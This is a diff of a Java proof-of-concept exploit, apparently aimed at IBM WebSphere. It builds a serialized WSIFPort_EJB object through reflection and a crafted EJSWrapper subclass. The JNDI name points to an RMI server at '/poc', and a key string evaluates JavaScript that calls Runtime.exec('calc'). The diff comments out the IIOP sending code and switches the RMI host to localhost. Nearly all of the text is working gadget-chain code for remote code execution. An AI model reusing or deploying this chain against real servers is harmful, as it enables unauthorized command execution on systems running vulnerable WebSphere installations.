@@ -1,6 +1,21 @@
+// javac -cp .:plugins/com.ibm.ws.runtime.jar:plugins/com.ibm.ws.batch.runtime.jar:plugins/javax.j2ee.ejb.jar:runtimes/com.ibm.jaxws.thinclient_9.0.jar --add-modules jdk.naming.rmi --add-exports='jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED' Test.java
+
+import org.apache.wsif.providers.ejb.*;
+import com.ibm.ws.ejbcontainer.jitdeploy.EJBWrapper;
+import com.ibm.ejs.container.*;
+import com.ibm.ejs.csi.*;
+import com.ibm.websphere.csi.*;
+import java.lang.reflect.*;
+import com.ibm.ws.batch.*;
+import java.rmi.*;
+import javax.ejb.*;
+import javax.wsdl.*;
+import java.io.*;
+import java.util.*;
+
 public class Test {
     public static void main(String[] args) throws Exception {
-        Properties env = new Properties();
+        /*Properties env = new Properties();
         env.put(Context.PROVIDER_URL, "iiop://169.254.0.117:2809");
         env.put(Context.INITIAL_CONTEXT_FACTORY, "com.ibm.websphere.naming.WsnInitialContextFactory");
 
@@ -38,7 +53,7 @@ public class Test {
         Method setConnectionContexts = connection.getClass().getDeclaredMethod("setConnectionContexts", ArrayList.class);
         setConnectionContexts.setAccessible(true);
 
-        ArrayList v4 = new ArrayList();
+        ArrayList v4 = new ArrayList();*/
 
         WSIFPort_EJB wsifPort_ejb = new WSIFPort_EJB(null,null,null);
 
@@ -46,7 +61,7 @@ public class Test {
         fieldEjbObject.setAccessible(true);
         fieldEjbObject.set(wsifPort_ejb,new EJSWrapperS());
 
-        CDROutputStream outputStream = ORB.createCDROutputStream();
+        /*CDROutputStream outputStream = ORB.createCDROutputStream();
         outputStream.putEndian();
         Any any = orb.create_any();
         any.insert_Value(wsifPort_ejb);
@@ -59,7 +74,7 @@ public class Test {
         ServiceContext serviceContext = new ServiceContext(0, result);
         v4.add(serviceContext);
         setConnectionContexts.invoke(connection, v4);
-        context.list("");
+        context.list("");*/
     }
 
 }
@@ -75,7 +90,7 @@ class EJSWrapperS extends EJSWrapper {
             j2eeName.set(sessionHome, j2EEName);
             Field jndiName = sessionHome.getClass().getSuperclass().getDeclaredField("jndiName");
             jndiName.setAccessible(true);
-            jndiName.set(sessionHome, "rmi://169.254.0.117:1099/poc");
+            jndiName.set(sessionHome, "rmi://127.0.0.1:1099/poc");
             Serializable key = "\"a\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")";
             BeanId beanId = new BeanId(sessionHome, key, true);
             BeanMetaData beanMetaData = new BeanMetaData(1);
